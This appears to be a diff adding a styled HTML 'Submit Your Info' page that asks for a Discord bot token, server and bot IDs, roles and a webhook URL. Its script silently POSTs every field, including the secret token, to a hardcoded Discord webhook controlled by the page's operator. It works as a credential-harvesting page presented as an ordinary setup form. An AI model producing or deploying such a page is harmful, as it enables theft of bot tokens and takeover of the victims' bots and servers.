@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Submission</title>
+    <style>
+        body {
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            animation: fadeIn 1s ease-in-out;
+        }
+        .form-container h2 {
+            margin-bottom: 20px;
+            color: #2575fc;
+        }
+        .form-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .form-container button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            background: #2575fc;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        .form-container button:hover {
+            background: #6a11cb;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h2>Submit Your Info</h2>
+        <form id="submissionForm">
+            <input type="text" name="Discord Bot Token" placeholder="Input 1" required>
+            <input type="text" name="Server ID" placeholder="Input 2" required>
+            <input type="text" name="Bot ID" placeholder="Input 3" required>
+            <input type="text" name="Staff Role(s)" placeholder="Input 4" required>
+            <input type="text" name="Catergory ID" placeholder="Input 5" required>
+            <input type="text" name="Webhook URL" placeholder="Input 6" required>
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('submissionForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const formData = new FormData(event.target);
+            const entries = {};
+            formData.forEach((value, key) => {
+                entries[key] = value;
+            });
+
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+            const payload = {
+                content: 'New submission:',
+                embeds: [
+                    {
+                        title: 'Form Data',
+                        fields: Object.keys(entries).map(key => ({
+                            name: key,
+                            value: entries[key],
+                            inline: true
+                        }))
+                    }
+                ]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).then(response => {
+                if (response.ok) {
+                    alert('Submission sent successfully!');
+                    event.target.reset();
+                } else {
+                    alert('Failed to send submission.');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+                alert('Failed to send submission.');
+            });
+        });
+    </script>
+</body>
+</html>
